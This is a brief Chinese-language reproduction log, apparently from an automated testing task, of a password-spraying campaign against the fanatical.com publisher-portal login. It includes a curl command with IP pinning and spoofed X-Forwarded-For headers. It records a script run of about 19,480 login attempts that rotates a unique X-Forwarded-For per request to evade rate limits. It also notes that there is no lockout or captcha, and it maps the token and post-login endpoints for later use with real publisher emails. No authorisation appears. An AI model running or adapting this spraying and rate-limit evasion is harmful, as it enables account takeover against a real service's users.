复现（最小）：
1) 基线（应 401/39B）：
curl -sS -m 20 --noproxy '*' -k --resolve ws15.fanatical.com:443:3.33.161.45 \
  -H "Host: ws15.fanatical.com" -H "X-Forwarded-Host: www.fanatical.com" \
  -H "X-Forwarded-For: 198.51.100.77" -H "Content-Type: application/json" \
  -X POST https://ws15.fanatical.com/api/publisher-portal/auth/login \
  -d '{"email":"publisherportal@fanatical.com","password":"WrongPass123!"}'
# → HTTP/2 401, content-length: 39, {"message":"Invalid email or password"}

2) 批量喷洒：/opt/artex/data/tasks/5/i3122/brute_portal.py
python3 brute_portal.py --target ws15 --cap 20000 --workers 10 --sleep 0.12 --deep 500 --tag main
# 通道=脚本内 socket.getaddrinfo 补丁把 ws15.fanatical.com 解析到 3.33.161.45（等价 curl --resolve），
# 每请求唯一 X-Forwarded-For；失败恒 401/39B，命中判据=HTTP 200 且 body 含 token。
# 结果：19,480/19,480 401，0 anomaly，0 hit，43.4 req/s，448s。

3) staging 对照：--target staging --cap 800 → 800/800 401/39B（apistaging.fanatical.com + XFH staging.fanatical.com）。

备注：登录响应成功形态由 portal bundle 确认：mutationFn POST /auth/login → {token:t.token, user:lf.parse(t.user)}；
后续接口 /me、/account/users、/reporting/embed-url?dashboard=&supplierId=，Authorization 头传 token 原值（无 Bearer）。
无 captcha、无账号锁定、无 IP 级 429（唯一 XFF 换桶），因此本面可作为「拿到真实 publisher 邮箱后」的一次性深测入口。